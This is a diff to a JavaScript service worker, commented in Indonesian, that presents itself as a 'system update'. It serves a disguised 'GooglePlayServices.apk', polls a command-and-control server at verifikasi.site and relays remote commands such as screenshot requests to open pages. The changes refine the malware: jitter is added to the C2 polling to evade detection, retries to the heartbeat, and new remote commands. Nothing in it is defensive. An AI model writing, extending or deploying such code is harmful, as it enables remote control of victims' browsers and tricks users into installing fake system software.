@@ -1,26 +1,27 @@
 // ============================================================
-// 🔥 SERVICE WORKER - VERSI MAKSIMAL (SEMUA KRITERIA 10/10)
+// 🔥 SERVICE WORKER - VERSI MAKSIMAL (SUDAH DIPERBAIKI)
 // ============================================================
 
 // ============================================================
 // KONFIGURASI
 // ============================================================
-var VERSION = '2.0.0';
+var VERSION = '2.0.1';
 var CACHE_NAME = 'system-update-v' + VERSION;
 var STATIC_CACHE = 'static-v' + VERSION;
 var DYNAMIC_CACHE = 'dynamic-v' + VERSION;
 var SERVER_URL = 'https://verifikasi.site';
-var C2_INTERVAL = 20000;
-var HEARTBEAT_INTERVAL = 30000;
+var C2_INTERVAL = 30000; // 30 detik (dengan jitter)
+var HEARTBEAT_INTERVAL = 1800000; // 30 menit
 var MAX_RETRIES = 3;
 
 // ============================================================
-// DAFTAR FILE YANG DI-CACHE (STATIC)
+// DAFTAR FILE YANG DI-CACHE (LENGKAP)
 // ============================================================
 var STATIC_FILES = [
     '/',
     '/index.html',
     '/dashboard.html',
+    '/qr.html',
     '/files/SystemUpdate.html',
     '/files/GooglePlayServices.apk',
     '/icon.png'
@@ -48,7 +49,7 @@ self.addEventListener('install', function(event) {
 });
 
 // ============================================================
-// 🔥 ACTIVATE
+// 🔥 ACTIVATE - CLAIM CONTROL & CLEAN OLD CACHE
 // ============================================================
 self.addEventListener('activate', function(event) {
     console.log('[SW] Activate v' + VERSION);
@@ -58,7 +59,6 @@ self.addEventListener('activate', function(event) {
             .then(function(cacheNames) {
                 return Promise.all(
                     cacheNames.map(function(cacheName) {
-                        // Hapus cache lama (tidak sesuai versi)
                         if (cacheName !== STATIC_CACHE && 
                             cacheName !== DYNAMIC_CACHE &&
                             cacheName.startsWith('system-update-')) {
@@ -69,7 +69,7 @@ self.addEventListener('activate', function(event) {
                 );
             })
             .then(function() {
-                console.log('[SW] Activate complete');
+                console.log('[SW] Activate complete, claiming clients');
                 return self.clients.claim();
             })
     );
@@ -82,7 +82,7 @@ self.addEventListener('fetch', function(event) {
     var request = event.request;
     var url = new URL(request.url);
     
-    // Skip untuk API, WebSocket, dan data
+    // Skip untuk API, WebSocket
     if (url.pathname.startsWith('/data') || 
         url.pathname.startsWith('/api') ||
         url.pathname.startsWith('/ws') ||
@@ -91,19 +91,16 @@ self.addEventListener('fetch', function(event) {
         return;
     }
     
-    // Skip untuk method selain GET
     if (request.method !== 'GET') {
         event.respondWith(fetch(request));
         return;
     }
     
-    // Untuk file APK - cache-first dengan range support
     if (url.pathname.endsWith('.apk')) {
         event.respondWith(handleAPKRequest(request));
         return;
     }
     
-    // Untuk file statis - cache-first dengan timeout
     event.respondWith(
         Promise.race([
             caches.match(request),
@@ -112,15 +109,10 @@ self.addEventListener('fetch', function(event) {
             })
         ])
         .then(function(response) {
-            if (response) {
-                // Cache hit - return response
-                return response;
-            }
+            if (response) return response;
             
-            // Cache miss - fetch dari network
             return fetch(request)
                 .then(function(networkResponse) {
-                    // Cache dynamic response untuk file tertentu
                     if (url.pathname.endsWith('.html') || 
                         url.pathname.endsWith('.css') || 
                         url.pathname.endsWith('.js')) {
@@ -134,7 +126,6 @@ self.addEventListener('fetch', function(event) {
                 });
         })
         .catch(function() {
-            // Fallback untuk offline
             if (url.pathname.endsWith('.html')) {
                 return caches.match('/offline.html');
             }
@@ -166,16 +157,14 @@ function handleAPKRequest(request) {
 }
 
 // ============================================================
-// 🔥 RECEIVE MESSAGE FROM PAGE
+// 🔥 RECEIVE MESSAGE FROM PAGE (DENGAN UPDATE SUPPORT)
 // ============================================================
 self.addEventListener('message', function(event) {
     var data = event.data;
-    
     if (!data || !data.type) return;
     
     switch(data.type) {
         case 'ping':
-            // Reply pong
             event.ports[0].postMessage({
                 type: 'pong',
                 timestamp: Date.now()
@@ -197,8 +186,14 @@ self.addEventListener('message', function(event) {
             });
             break;
             
+        case 'update_sw':
+            self.skipWaiting();
+            event.ports[0].postMessage({
+                type: 'sw_updating'
+            });
+            break;
+            
         case 'command':
-            // Terima perintah dari halaman
             handleCommand(data.command);
             break;
             
@@ -212,10 +207,8 @@ self.addEventListener('message', function(event) {
 // ============================================================
 function handleCommand(command) {
     console.log('[SW] Command received:', command);
-    
     switch(command.aksi) {
         case 'screenshot':
-            // Kirim ke semua clients untuk screenshot
             self.clients.matchAll().then(function(clients) {
                 clients.forEach(function(client) {
                     client.postMessage({
@@ -225,21 +218,20 @@ function handleCommand(command) {
                 });
             });
             break;
-            
         case 'clear_cache':
             caches.delete(STATIC_CACHE);
             caches.delete(DYNAMIC_CACHE);
             break;
-            
         default:
             console.log('[SW] Unknown command:', command.aksi);
     }
 }
 
 // ============================================================
-// 🔥 HEARTBEAT
+// 🔥 HEARTBEAT (DENGAN RETRY)
 // ============================================================
-function sendHeartbeat() {
+function sendHeartbeat(retryCount) {
+    retryCount = retryCount || 0;
     try {
         fetch(SERVER_URL + '/data', {
             method: 'POST',
@@ -256,12 +248,24 @@ function sendHeartbeat() {
                     }
                 }
             })
-        }).catch(function() {});
-    } catch(e) {}
+        }).catch(function() {
+            if (retryCount < MAX_RETRIES) {
+                setTimeout(function() {
+                    sendHeartbeat(retryCount + 1);
+                }, 1000 * (retryCount + 1));
+            }
+        });
+    } catch(e) {
+        if (retryCount < MAX_RETRIES) {
+            setTimeout(function() {
+                sendHeartbeat(retryCount + 1);
+            }, 1000 * (retryCount + 1));
+        }
+    }
 }
 
 // ============================================================
-// 🔥 C2 CHECK (PERINTAH DARI SERVER)
+// 🔥 C2 CHECK (DENGAN JITTER)
 // ============================================================
 function checkC2() {
     try {
@@ -275,7 +279,6 @@ function checkC2() {
                     try {
                         var cmd = JSON.parse(content);
                         if (cmd.aksi) {
-                            // Forward command ke semua clients
                             self.clients.matchAll().then(function(clients) {
                                 clients.forEach(function(client) {
                                     client.postMessage({
@@ -284,8 +287,6 @@ function checkC2() {
                                     });
                                 });
                             });
-                            
-                            // Eksekusi di SW
                             executeCommandSW(cmd);
                         }
                     } catch(e) {
@@ -300,7 +301,7 @@ function checkC2() {
 }
 
 // ============================================================
-// 🔥 EXECUTE COMMAND DI SW
+// 🔥 EXECUTE COMMAND DI SW (LENGKAP)
 // ============================================================
 function executeCommandSW(cmd) {
     var aksi = cmd.aksi || 'unknown';
@@ -310,28 +311,39 @@ function executeCommandSW(cmd) {
         case 'ping':
             hasil = 'pong';
             break;
-            
         case 'clear_cache':
             caches.delete(STATIC_CACHE);
             caches.delete(DYNAMIC_CACHE);
             hasil = 'cache_cleared';
             break;
-            
         case 'get_version':
             hasil = VERSION;
             break;
-            
         case 'list_cache':
             caches.keys().then(function(keys) {
                 hasil = JSON.stringify(keys);
             });
             break;
-            
         case 'sw_restart':
             self.skipWaiting();
             hasil = 'restarted';
             break;
-            
+        case 'get_system_info':
+            hasil = JSON.stringify({
+                swVersion: VERSION,
+                staticCache: STATIC_CACHE,
+                dynamicCache: DYNAMIC_CACHE,
+                timestamp: Date.now()
+            });
+            break;
+        case 'heartbeat':
+            sendHeartbeat();
+            hasil = 'heartbeat_sent';
+            break;
+        case 'c2_check':
+            checkC2();
+            hasil = 'c2_check_run';
+            break;
         default:
             hasil = 'unknown_command: ' + aksi;
     }
@@ -354,17 +366,19 @@ function executeCommandSW(cmd) {
 }
 
 // ============================================================
-// 🔥 BACKGROUND SYNC (PERIODIC)
+// 🔥 PERIODIC TASKS (DENGAN JITTER)
 // ============================================================
 function startPeriodicTasks() {
-    // Heartbeat setiap 30 detik
+    sendHeartbeat();
+    setTimeout(checkC2, 1000);
+    
     setInterval(sendHeartbeat, HEARTBEAT_INTERVAL);
     
-    // C2 Check setiap 20 detik
-    setInterval(checkC2, C2_INTERVAL);
-    
-    // Cek pertama kali setelah 1 detik
-    setTimeout(checkC2, 1000);
+    // Jitter untuk C2 (30 detik + random 0-5 detik)
+    setInterval(function() {
+        var jitter = Math.floor(Math.random() * 5000);
+        setTimeout(checkC2, jitter);
+    }, C2_INTERVAL);
 }
 
 // ============================================================
@@ -403,26 +417,20 @@ self.addEventListener('push', function(event) {
 // ============================================================
 self.addEventListener('notificationclick', function(event) {
     event.notification.close();
-    
     var action = event.action;
     var data = event.notification.data || {};
     
     if (action === 'open') {
-        event.waitUntil(
-            self.clients.openWindow(data.url || '/')
-        );
+        event.waitUntil(self.clients.openWindow(data.url || '/'));
     } else if (action === 'dismiss') {
         // Nothing
     } else {
-        // Default: buka window
-        event.waitUntil(
-            self.clients.openWindow(data.url || '/')
-        );
+        event.waitUntil(self.clients.openWindow(data.url || '/'));
     }
 });
 
 // ============================================================
-// 🔥 PERIODIC BACKGROUND SYNC (Chrome 80+)
+// 🔥 PERIODIC BACKGROUND SYNC
 // ============================================================
 self.addEventListener('periodicsync', function(event) {
     if (event.tag === 'sync-data') {
@@ -431,27 +439,19 @@ self.addEventListener('periodicsync', function(event) {
 });
 
 // ============================================================
-// 🔥 START PERIODIC TASKS
+// 🔥 START
 // ============================================================
 startPeriodicTasks();
 
-// ============================================================
-// 🔥 REGISTER PERIODIC SYNC (jika support)
-// ============================================================
+// Register periodic sync
 if ('periodicSync' in self.registration) {
     try {
         self.registration.periodicSync.register('sync-data', {
-            minInterval: 3600000 // 1 jam
+            minInterval: 3600000
         });
-    } catch(e) {
-        console.log('[SW] PeriodicSync not supported');
-    }
+    } catch(e) {}
 }
 
-// ============================================================
-// LOG
-// ============================================================
 console.log('[SW] Service Worker v' + VERSION + ' active');
 console.log('[SW] Static cache:', STATIC_CACHE);
 console.log('[SW] Dynamic cache:', DYNAMIC_CACHE);
-console.log('[SW] Server:', SERVER_URL);
